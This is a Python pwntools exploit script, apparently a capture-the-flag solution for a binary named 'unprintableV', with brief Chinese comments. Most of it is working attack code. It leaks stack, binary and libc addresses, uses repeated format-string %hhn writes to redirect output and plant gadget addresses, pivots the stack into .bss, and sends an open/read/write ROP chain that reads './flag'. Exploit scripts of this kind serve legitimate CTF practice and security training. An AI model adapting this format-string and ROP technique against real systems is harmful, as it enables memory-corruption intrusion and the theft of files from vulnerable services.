#!/usr/bin/env python3
from pwn import *
context(arch = 'amd64', os = 'linux', terminal=['tmux', 'splitw', '-h'])

r = process('./unprintableV')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r.recvuntil('gift: ')
leak_stack = int(r.recvuntil('\n')[:-1],16)
log.info('leak_stack : {}'.format(hex(leak_stack)))
r.recv()

'''
題目給的leak_stack的位置剛好是buf的位置，
所以可以藉由2條RBP chain先將buf改成stdout的位置
'''
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format(leak_stack & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(0x20))

'''
stderr的最低3bytes是0x680，
所以第4bytes有1/16的機率
'''
time.sleep(0.2)
r.sendline('%{}c%9$hn'.format(0x680)) # 先關ASLR測試

time.sleep(0.2)
r.sendline('%p.%3$p')

binary_base = int(r.recvuntil('.')[:-1],16) - 0x202060 # buf address
buf = binary_base + 0x202060
libc_base = int(r.recvuntil('\n')[:-1],16) - 0x110191 # libc_read address
leave_ret = libc_base + 0x0000000000034d33
leave_ret_1 = binary_base  + 0x00000000000009f8
log.info('binary_base : {}'.format(hex(binary_base)))
log.info('buf : {}'.format(hex(buf)))
log.info('libc_base : {}'.format(hex(libc_base)))
log.info('leave_ret : {}'.format(hex(leave_ret)))

'''
寫ROP chain在buf上(.bss)
將stack遷移到buf上
'''
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format((buf) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18 + 1) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((buf + 1) >> 8) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18 + 2) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((buf + 2) >> 16) & 0xff))
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18 + 3) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((buf + 3) >> 24) & 0xff))
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18 + 4) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((buf + 4) >> 32) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18 + 5) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((buf + 5) >> 40) & 0xff))
time.sleep(0.2)

r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(leave_ret & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20 + 1) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((leave_ret + 1) >> 8) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20 + 2) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((leave_ret + 2) >> 16) & 0xff))
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20 + 3) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((leave_ret + 3) >> 24) & 0xff))
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20 + 4) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((leave_ret + 4) >> 32) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%6$hhn'.format((leak_stack + 0x20 + 5) & 0xff)) 
time.sleep(0.2)
r.sendline('%{}c%10$hhn'.format(((leave_ret + 5) >> 40) & 0xff))
time.sleep(0.2)

r.sendline('%{}c%6$hhn'.format((leak_stack + 0x18) & 0xff))

pop_rsi_ret = libc_base + 0x0000000000023e8a
pop_rdi_ret = libc_base + 0x000000000002155f
pop_rdx_ret = libc_base + 0x0000000000001b96
open_addr = libc_base + libc.symbols[b'open']
read_addr = libc_base + libc.symbols[b'read']
write_addr = libc_base + libc.symbols[b'write']

input('#')
rop = b'd^3CTF'.ljust(8,b'\x00')
rop+= p64(pop_rsi_ret)
rop+= p64(0)
rop+= p64(pop_rdi_ret)
rop+= p64(buf + 0x100) # buf + 0x100 : flag addr
rop+= p64(open_addr)
rop+= p64(pop_rdx_ret)
rop+= p64(0x10)
rop+= p64(pop_rsi_ret)
rop+= p64(buf + 0x120)
rop+= p64(pop_rdi_ret)
rop+= p64(1)
rop+= p64(read_addr)
rop+= p64(pop_rdx_ret)
rop+= p64(0x10)
rop+= p64(pop_rsi_ret)
rop+= p64(buf + 0x120)
rop+= p64(pop_rdi_ret)
rop+= p64(2)
rop+= p64(write_addr)
rop = rop.ljust(0x100,b'\x00')
rop+= b'./flag\x00\x00'
r.sendline(rop)

r.interactive()
